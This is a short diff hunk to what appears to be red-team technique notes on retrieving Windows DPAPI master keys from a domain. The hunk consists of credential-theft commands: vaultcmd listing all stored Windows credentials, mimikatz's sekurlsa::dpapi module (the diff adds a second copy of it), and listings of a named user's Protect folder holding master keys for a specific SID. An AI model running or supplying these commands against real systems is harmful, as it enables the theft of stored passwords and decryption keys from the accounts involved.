@@ -4,6 +4,7 @@ The next step is to retrieve the actual MasterKey from the Domain
 ```
 shell vaultcmd /listcreds:"Windows Credentials" /all
 mimikatz !sekurlsa::dpapi
+sekurlsa::dpapi
 
 ls C:\Users\NyaMeeEain\AppData\Roaming\Microsoft\Protect
 ls C:\Users\NyaMeeEain\AppData\Roaming\Microsoft\Protect\S-1-5-21-3865823697-1816233505-1834004910-1132
